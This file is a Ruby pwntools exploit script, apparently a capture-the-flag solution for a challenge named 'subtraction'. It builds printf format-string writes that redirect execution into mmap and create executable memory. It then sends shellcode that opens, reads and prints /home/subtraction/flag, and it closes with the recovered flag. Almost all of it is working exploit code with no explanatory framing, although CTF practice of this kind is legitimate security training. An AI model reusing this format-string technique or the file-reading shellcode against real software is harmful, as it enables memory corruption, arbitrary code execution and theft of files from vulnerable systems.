#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

#================= Exploit Start ====================
# context.arch = 'amd64' 
# sleep(10)

def send(str)
  # $stderr.puts str.size
  (p str.size;fail) if str.size > 0x20
  print str.ljust(0x20, 'A')
end

def norm(s, len)
  r = ((s - @cur_i + 256 ** len) % (256 ** len))
  r = 256 ** len if r == 0
  @cur_i += r
  r
end

def fmt1(addr, b, len: 1)
  @pre ||= ''
  @suf ||= ''
  @cur_i ||= 0
  fail if addr.p32.include?("\x00")
  @pre << addr.p32
  ii = @pre.size / 4 + @__offset
  case len
  when 1; @suf << "%#{norm(b, len)}c%#{ii}$hhn"
  when 2; @suf << "%#{norm(b, len)}c%#{ii}$hn"
  # when 4; @suf << "%#{norm(b.u32, len)}c%#{ii}$n"
  else fail
  end
end

def collect
  ret = @pre + @suf
  @pre = ''
  @suf = ''
  @cur_i = 0
  ret
end

# mmap(0xdeae0000, 0x30000, 7, 34, -1, 0)
@__offset = 4 + 0x20 / 4
@cur_i = 12 * 4 + 0x20
fmt1(0xdead0fec, 0xe1) # ret to mmap
fmt1(0xdead0ff0, 0)
fmt1(0xdead0ff2, 0xdeaf, len: 2) # arg0 = 0xdeaf0000
fmt1(0xdead0ff4, 0, len: 2)
fmt1(0xdead0ff6, 3, len: 2) # arg1 = 0x30000
fmt1(0xdead0ff8, 7) # arg2 = 7
fmt1(0xdead0ffc, 34) # arg3
fmt1(0xdead0fff, 0xff00, len: 2)
fmt1(0xdead1001, 0xff, len: 1)
fmt1(0xdead1002, 0xffff, len: 2) # arg4
fmt1(0xdead1004, 0, len: 2)
fmt1(0xdead1006, 0, len: 2)
ff2 = collect
@__offset = 4
ff2.bytes.each_with_index.to_a.reverse.each do |b, addr|
  @cur_i = 4
  fmt1(addr + 0xdead1028, b)
  send(collect)
end

send('')
print asm(
  shellcraft.pushstr('/home/subtraction/flag') +
  shellcraft.syscall('SYS_open', 'esp', 0, 0) +
  shellcraft.syscall('SYS_read', 'eax', 'esp', 0x1111) +
  shellcraft.syscall('SYS_write', 1, 'esp', 0x7ff) +
  shellcraft.syscall('SYS_exit', 0)
).ljust(96, "\x90")

# flag{pr1n7f_15_600d_47_51mpl3_m47h}
